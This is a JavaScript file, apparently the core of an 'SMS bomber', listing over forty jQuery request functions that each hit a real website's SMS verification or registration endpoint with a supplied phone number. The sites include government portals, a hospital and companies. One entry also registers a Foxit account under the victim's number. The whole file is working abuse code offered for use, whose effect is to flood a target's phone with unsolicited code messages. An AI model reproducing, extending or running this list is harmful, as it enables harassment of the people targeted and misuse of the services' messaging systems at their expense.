/**
 * 第三方网站短信接口
 * 最后更新：2023-09-28
 * @type {*[]}
 */
var requestList = [
    {
        name: "编程猫",
        fn: function (phone) {
            $.ajax({
                url: 'https://open-service.codemao.cn/captcha/rule',
                contentType: "application/json;charset=UTF-8",
                type: 'POST',
                data: '{"deviceId": "89b5cb3b00a910b2a123d882a6255caf", "identity": "' + phone + '", "pid": "4ceH5ekc", "timestamp": 1614589965}',
                dataType: 'json',
                success: function (data) {
                    $.ajax({
                        url: 'https://api-marketing.codemao.cn/admin/marketing/sms/captcha/new',
                        contentType: "application/json;charset=UTF-8",
                        type: 'POST',
                        data: '{"app_id":"", "phone_number": "' + phone + '", "ticket": "' + data.ticket + '"}',
                        dataType: 'json',
                    })
                }
            })
        }
    },
    {
        name: '网易',
        fn: function (phone) {
            $.ajax({
                url: "https://dz.blizzard.cn/action/user/mobile/captcha",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '水利部',
        fn: function (phone) {
            $.ajax({
                url: "http://sso.mwr.cn/suserRegister/verifyAccountAndPhone.action",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '天鹅到家',
        fn: function (phone) {
            $.ajax({
                url: "https://user.daojia.com/mobile/getcode?mobile="+phone+"&newVersion=1&bu=112",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '济宁专技',
        fn: function (phone) {
            $.ajax({
                url: "https://sdjn-web.yxlearning.com/sendPhoneCode.gson",
                type: "POST",
                data: {"phone": phone, "sendType": "4"},
                dataType: "json",
            })
        }
    },
    {
        name: '大广节',
        fn: function (phone) {
            $.ajax({
                url: "http://47.103.35.255:510/api/Account/SendRestigerSms",
                type: "POST",
                data: {tel: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '选择山东云平台',
        fn: function (phone) {
            $.ajax({
                url: "http://israel.selectshandong.com/user/verification_code/send.html",
                type: "POST",
                data: {mobile: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '泰安专技',
        fn: function (phone) {
            $.ajax({
                url: "https://sdta-web.yxlearning.com/sendPhoneCode.gson",
                type: "POST",
                data: {"phone": phone, "sendType": "4"},
                dataType: "json",
            })
        }
    },
    {
        name: '金万维',
        fn: function (phone) {
            $.ajax({
                url: "https://www.kuaijiexi.com/sendPhoneMessage",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '凤凰金刚网',
        fn: function (phone) {
            $.ajax({
                url: "https://api.shweina.com/sms/getCode?type=1&mobile="+phone+"&sms_id=1&_=1649572691296",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: 'SDTF',
        fn: function (phone) {
            $.ajax({
                url: "http://www.satdatafresh.com/Register_send.php",
                type: "POST",
                data: {phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'UCG',
        fn: function (phone) {
            $.ajax({
                url: "http://api.ucg.cn/api/account/get_code",
                type: "POST",
                data: {phone: phone,type:1},
                dataType: "json",
            })
        }
    },
    {
        name: 'TCTY评测委员会',
        fn: function (phone) {
            $.ajax({
                url: "https://bth.educg.net/new_registration.do",
                type: "POST",
                data: {"op": "getvfycode",phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '中电仪器',
        fn: function (phone) {
            $.ajax({
                url: "https://ceyear.com/Cn/Member/get_code",
                type: "POST",
                data: {phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '赛客呼吸',
        fn: function (phone) {
            $.ajax({
                url: "https://m.xeek.cn/api/common/CheckCode/index.html",
                type: "POST",
                data: {"action":"register","account":phone,"accountType":"3"},
                dataType: "json",
            })
        }
    },
    {
        name: '佛山政务短信平台',
        fn: function (phone) {
            $.ajax({
                url: "https://fsjf.fslgb.gov.cn/servlet/user",
                type: "POST",
                data: {"type":"getCode","certificate":"","phone":phone,"opr":"注册"},
                dataType: "json",
            })
        }
    },
    {
        name: '金鹰',
        fn: function (phone) {
            $.ajax({
                url: "https://go.jinying.com/ajax_session/interface/user/user_reg_login",
                type: "POST",
                data: {"do":"get_reg_sms","mobile":phone},
                dataType: "json",
            })
        }
    },
    {
        name: '天地图',
        fn: function (phone) {
            $.ajax({
                url: "https://uums.tianditu.gov.cn/registerSendSms",
                type: "POST",
                data: {mobileAuth: phone,type: 2},
                dataType: "json",
            })
        }
    },
    {
        name: '福昕账号',
        fn: function (phone) {
            $.ajax({
                url: "https://sso.foxitreader.cn/register",
                type: "POST",
                data: {"username": phone,"password": "hhhhhhhhhhh","nickname": "hh"},
                dataType: "json",
            })
        }
    },
    {
        name: '云工',
        fn: function (phone) {
            $.ajax({
                url: "https://www.yungong.com/auth/mobileCode",
                type: "POST",
                data: {mobile: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '短剧本',
        fn: function (phone) {
            $.ajax({
                url: "https://www.shenmaio.com/Login/sendsms",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '南川文化馆提示',
        fn: function (phone) {
            $.ajax({
                url: "https://nanchuan-szwhg.chaoxing.com/api/code/mobile",
                type: "POST",
                data: {"mobile": phone,"type": "regist"},
                dataType: "json",
            })
        }
    },
    {
        name: '赛迪云',
        fn: function (phone) {
            $.ajax({
                url: "https://www.cisdicloud.com.cn/management/api/v1/sso/sendMesAuthcodeByMoblie/"+phone,
                type: "POST",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '喜运达',
        fn: function (phone) {
            $.ajax({
                url: "https://erp.goluckyvip.com/api/account/captcha",
                type: "POST",
                data: {mobile:"0086-"+phone},
                dataType: "json",
	raw: true,
            })
        }
    },
    {
        name: '知远所',
        fn: function (phone) {
            $.ajax({
                url: "http://www.knowfar.net.cn/passport/ajax.aspx?oper=ajaxGetCode",
                type: "POST",
                data: {mobiletel: phone,isregister: 1},
                dataType: "json",
            })
        }
    },
    {
        name: '苏州人才网',
        fn: function (phone) {
            $.ajax({
                url: "http://exam1.szrc.cn:8080/PublicWeb/api/Regist/GetCode",
                type: "POST",
                data: {Phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '模拟考试平台',
        fn: function (phone) {
            $.ajax({
                url: "http://60.205.108.68/api/passport/forget/vcode",
                type: "POST",
                data: {mobile: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '知了堂',
        fn: function (phone) {
            $.ajax({
                url: "http://47.108.174.127:51001/zltacenter/zltlogin/sendiphone",
                type: "POST",
                data: {mobile: phone,smsmode:0},
                dataType: "json",
            })
        }
    },
    {
        name: '北京协和医院',
        fn: function (phone) {
            $.ajax({
                url: "https://pumch.iflyhealth.com/api/hsms-service/v2/pb/sms/sendCode?phone="+phone+"&smsType=0",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '消防设施',
        fn: function (phone) {
            $.ajax({
                url: "https://go.bocew.com/v1/user/sendCode",
                type: "POST",
                data: {iphone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '西山居',
        fn: function (phone) {
            $.ajax({
                url: "https://kefu.xoyo.com/?r=api/service_verify&mobile_num="+phone+"&service_id=1",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '智联软件',
        fn: function (phone) {
            $.ajax({
                url: "http://www.tscss.org/uaa/sms/code",
                type: "POST",
                data: {mobile: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '环宇会议',
        fn: function (phone) {
            $.ajax({
                url: "http://www.womeneyedoctor.com.cn/api/sms/send.html",
                type: "POST",
                data: {event: "son-register",mobile:phone},
                dataType: "json",
            })
        }
    },
    {
        name: '金链盟',
        fn: function (phone) {
            $.ajax({
                url: "https://www.fisco.com.cn/api.php/sms",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '克拉玛依',
        fn: function (phone) {
            $.ajax({
                url: "http://www.klmyippc.com/register/sendMsg",
                type: "POST",
                data: {mobile:phone,type:"save"},
                dataType: "json",
            })
        }
    },
    {
        name: '文旅干部',
        fn: function (phone) {
            $.ajax({
                url: "https://www.cactatv.cn/get-phoneCode",
                type: "POST",
                data: {account:phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'BAM',
        fn: function (phone) {
            $.ajax({
                url: "http://bamcases.net/wap/index/ajaxapi",
                type: "POST",
                data: {method: "System.Login.sendRegisterMobileCode",param:" {\"mobile\":\""+phone+"\"}"},
                dataType: "json",
            })
        }
    },
    {
        name: '永硕E盘',
        fn: function (phone) {
            $.ajax({
                url: "http://www.ys168.com/register/",
                type: "POST",
                data: {cz: "fsdx",sj: phone,dlmc: "hhhh67hh"},
                dataType: "json",
            })
        }
    },
    {
        name: '比亚迪',
        fn: function (phone) {
            $.ajax({
                url: "https://oip.byd.com/index/user/sendMobileCaptcha?mobile="+phone+"&type=register",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: 'Fabrie文档',
        fn: function (phone) {
            $.ajax({
                url: "https://www.fabrie.cn/api/user/send-sms",
                type: "POST",
                data: {mobilePhone:phone},
                dataType: "json",
            })
        }
    },
    {
        name: '金蝶',
        fn: function (phone) {
            $.ajax({
                url: "http://wscloud.kingdee.com/wxPlatform/user/getVerifyCode?phone="+phone,
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '一点资讯',
        fn: function (phone) {
            $.ajax({
                url: "https://mp.yidianzixun.com/signup/sendcaptcha",
                type: "POST",
                data: {mobile:phone},
                dataType: "json",
            })
        }
    },
    {
        name: '猎豹应用',
        fn: function (phone) {
            $.ajax({
                url: "https://api.nmgxa.com/api/web/common/captcha",
                type: "POST",
                data: {type:0,username:phone},
                dataType: "json",
            })
        }
    },
    {
        name: '法宣在线',
        fn: function (phone) {
            $.ajax({
                url: "http://dev.faxuanyun.com/uds/user/sendValidateMeg.do",
                type: "POST",
                data: {userCode:"",userinfo: phone,type: "2_3_10"},
                dataType: "json",
            })
        }
    }
]
